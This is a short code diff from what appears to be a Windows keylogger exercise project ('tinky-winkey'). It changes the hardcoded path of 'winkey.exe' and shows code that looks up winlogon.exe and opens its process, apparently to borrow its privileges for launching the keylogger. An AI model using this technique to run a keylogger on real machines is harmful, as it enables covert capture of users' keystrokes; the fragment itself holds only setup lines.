@@ -193,7 +193,7 @@ void    Tinky_Winky() {
     DWORD winlogonPID;
     HANDLE wlPH;
     HANDLE wlTH;
-    LPWSTR PP = L"C:\\Users\\Public\\winkey.exe";
+    LPWSTR PP = L"C:\\Users\\User\\source\\repos\\tinky-winkey\\winkey.exe";
 
     winlogonPID = GetPidByName("winlogon.exe");
     wlPH = OpenProcess(PROCESS_QUERY_INFORMATION, 0, winlogonPID);
